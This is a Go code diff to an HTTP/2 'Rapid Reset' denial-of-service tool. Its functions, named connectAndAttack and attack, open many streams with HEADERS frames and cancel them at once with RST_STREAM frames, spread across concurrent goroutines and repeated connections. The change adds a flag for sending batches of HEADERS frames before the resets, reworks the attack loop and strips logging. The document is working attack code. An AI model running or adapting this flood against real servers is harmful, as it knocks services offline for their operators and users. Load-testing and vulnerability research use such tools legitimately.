@@ -89,6 +89,7 @@ var monitorDelay = flag.Int("monitorDelay", 100, "delay between connection monit
 var monitoringEnabled = flag.Bool("monitor", false, "enable performance monitoring")
 var monitorLogPath = flag.String("monitorLog", "monitor.log", "path to performance monitor logfile")
 var connectAttempts = flag.Int("connectAttempts", 1, "number of consecutive connections to run the test on (per connect-routine)")
+var consecutiveSends = flag.Uint("consecutiveSends", 1, "number of HEADERS frames to send before sending RST_STREAM frames (per attempt)")
 
 func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
 	var headerBlock bytes.Buffer
@@ -274,14 +275,14 @@ func connectAndAttack(serverUrl *url.URL, conf *tls.Config, connId int) ReadFram
 
 	//at this point, the connection is established.
 
-	var streamCounter uint32 = 1 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
-	var l *sync.Mutex = nil
+	var streamCounter uint32 = 1
+	var lock *sync.Mutex = nil
 	if *routines > 1 {
-		l = &sync.Mutex{}
+		lock = &sync.Mutex{}
 	}
 	for i := 0; i < *routines; i++ {
 		streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
-		go attack(streamFramer, serverUrl, &streamCounter, l)
+		go attack(streamFramer, serverUrl, &streamCounter, lock)
 	}
 
 	res := readFrames(conn, connId)
@@ -292,7 +293,7 @@ func connectAndAttack(serverUrl *url.URL, conf *tls.Config, connId int) ReadFram
 func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId int, wg *sync.WaitGroup) {
 	var res ReadFrameResult
 	for i := 0; i < *connectAttempts; i++ {
-		log.Printf("start attack wave %d on connection %d", i, connId)
+		//log.Printf("start attack wave %d on connection %d", i, connId)
 		r := connectAndAttack(serverUrl, conf, connId)
 		res.Add(r)
 	}
@@ -327,7 +328,6 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 			rfr.Data++
 		case http2.FrameGoAway:
 			rfr.GoAway++
-			log.Printf("received GOAWAY frame: %v", frame.(*http2.GoAwayFrame))
 			rfr.Err = GOAWAY
 			if !*ignoreGoAway {
 				return rfr
@@ -338,7 +338,6 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 			rfr.RSTStream++
 		case http2.FrameWindowUpdate:
 			rfr.WindowUpdate++
-			log.Printf("received WINDOW_UPDATE frame: %v", frame.(*http2.WindowUpdateFrame))
 		default:
 			rfr.Unknown++
 		}
@@ -346,28 +345,34 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 }
 
 func attack(framer *http2.Framer, url *url.URL, streamCounter *uint32, lock *sync.Mutex) {
+	opened := make([]uint32, *consecutiveSends)
+	hp := createHeaderFrameParam(url, 0)
+
 	for i := uint(0); i < *attempts; i++ {
-		if lock != nil {
-			lock.Lock()
-		}
-		var streamId uint32 = *streamCounter + 2
-		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
-		*streamCounter = streamId
-		if lock != nil {
-			lock.Unlock()
+		for j := uint(0); j < *consecutiveSends; j++ {
+			if lock != nil {
+				lock.Lock()
+			}
+			hp.StreamID = *streamCounter
+			*streamCounter += 2
+			err := framer.WriteHeaders(hp)
+			if lock != nil {
+				lock.Unlock()
+			}
+
+			opened[j] = hp.StreamID
+			if err != nil {
+				log.Printf("[stream %d] unable to send initial HEADERS frame", hp.StreamID)
+				return
+			}
 		}
 
-		if err != nil {
-			log.Printf("[stream %d] unable to send initial HEADERS frame", streamId)
-			return
-		}
-
-		time.Sleep(time.Millisecond * time.Duration(*sleep))
-
-		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
-		if err != nil {
-			log.Printf("[stream %d] unable to write RST_STREAM frame: %v", streamId, err)
-			return
+		for _, v := range(opened) {
+			err := framer.WriteRSTStream(v, http2.ErrCodeCancel)
+			if err != nil {
+				log.Printf("[stream %d] unable to write RST_STREAM frame: %v", v, err)
+				return
+			}
 		}
 	}
 }
